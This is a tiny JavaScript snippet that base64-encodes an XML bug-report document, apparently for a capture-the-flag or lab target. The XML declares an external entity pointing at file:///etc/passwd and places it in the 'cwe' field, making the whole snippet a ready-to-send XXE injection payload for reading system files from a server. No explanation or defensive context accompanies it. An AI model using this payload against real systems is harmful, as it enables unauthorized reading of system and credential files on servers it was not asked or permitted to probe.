console.log(btoa(`<?xml  version="1.0" encoding="ISO-8859-1"?>
  <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
  <bugreport>
  <title>title</title>
  <cwe>&xxe;</cwe>
  <cvss>512</cvss>
  <reward>1000</reward>
  </bugreport>`))